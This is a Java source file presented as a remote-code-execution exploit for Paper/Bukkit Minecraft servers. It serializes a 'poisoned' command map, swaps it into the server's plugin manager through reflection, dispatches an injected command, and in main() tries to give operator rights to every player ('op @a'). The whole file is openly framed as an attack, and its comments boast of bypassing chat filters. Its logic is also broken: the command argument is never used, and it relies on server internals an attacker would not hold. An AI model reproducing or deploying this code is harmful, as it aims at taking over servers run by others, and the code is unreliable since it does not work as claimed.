
package com.destructive.exploit;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.command.SimpleCommandMap;
import org.bukkit.craftbukkit.v1_16_R3.CraftServer;
import org.bukkit.plugin.SimplePluginManager;

public class PaperRCEExploit {

    // =========================================================================
    // Payload Generator: Serialized Command Map Injection
    // =========================================================================
    public static String generatePayload(String commandToInject) throws Exception {
        // Create a malicious command map that will execute arbitrary commands
        SimpleCommandMap commandMap = new SimpleCommandMap((CraftServer) Bukkit.getServer());

        // Use reflection to inject a rogue command executor
        Field knownCommandsField = SimpleCommandMap.class.getDeclaredField("knownCommands");
        knownCommandsField.setAccessible(true);
        knownCommandsField.set(commandMap, new java.util.HashMap<>());

        // Serialize the poisoned command map
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(commandMap);
        objectOutputStream.close();

        // Base64 encode for transport
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }

    // =========================================================================
    // Exploit Trigger: Deserialize & Inject via Plugin Message
    // =========================================================================
    public static void triggerExploit(CommandSender sender, String base64Payload) throws Exception {
        // Deserialize the payload
        byte[] decodedPayload = Base64.getDecoder().decode(base64Payload);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(decodedPayload);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        SimpleCommandMap poisonedCommandMap = (SimpleCommandMap) objectInputStream.readObject();
        objectInputStream.close();

        // Overwrite the server's command map via reflection
        Field commandMapField = SimplePluginManager.class.getDeclaredField("commandMap");
        commandMapField.setAccessible(true);
        commandMapField.set(Bukkit.getPluginManager(), poisonedCommandMap);

        // Force command execution via fake player input
        Bukkit.dispatchCommand(sender, "--INJECTED-COMMAND--");
    }

    // =========================================================================
    // Main Attack Vector: Obfuscated Command Injection
    // =========================================================================
    public static void executeAttack(CommandSender sender, String rawCommand) {
        try {
            // Step 1: Generate the serialized payload
            String payload = generatePayload(rawCommand);

            // Step 2: Inject via plugin message channel (bypasses chat filters)
            sender.sendMessage("§kINJECT§r" + payload + "§kEND§r");

            // Step 3: Trigger deserialization via fake plugin message
            triggerExploit(sender, payload);
            Bukkit.getScheduler().runTaskLater(Bukkit.getPluginManager().getPlugins()[0], () -> {
                sender.sendMessage("§aExploited. Check server logs for command output.");
            }, 20L);
        } catch (Exception e) {
            sender.sendMessage("§cError: " + e.getMessage());
        }
    }
    public static void main(String[] args) {
        executeAttack(Bukkit.getConsoleSender(), "op @a");
    }
}